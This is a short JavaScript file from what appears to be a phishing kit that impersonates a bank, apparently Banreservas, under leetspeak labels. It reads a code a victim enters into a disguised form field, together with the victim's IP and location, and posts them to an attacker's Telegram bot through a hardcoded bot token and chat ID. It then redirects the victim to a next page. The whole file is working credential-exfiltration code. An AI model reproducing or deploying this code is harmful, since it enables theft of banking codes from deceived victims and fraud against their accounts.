//bot token
var telegram_bot_id = "6693083402:AAHOkGb9YsAiQyRuzaUQTP4a-x38pcIm1pk";
//chat id
var chat_id = "-1001929534511";var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    ip = document.getElementById("ip").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹B4NR3SE3RV V.3🔹\n🔐C0DIX: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
       $.ajax(settings).done(function (response) {
        window.location = 'index4.html';
        console.log(response);
    });
    return false;
};
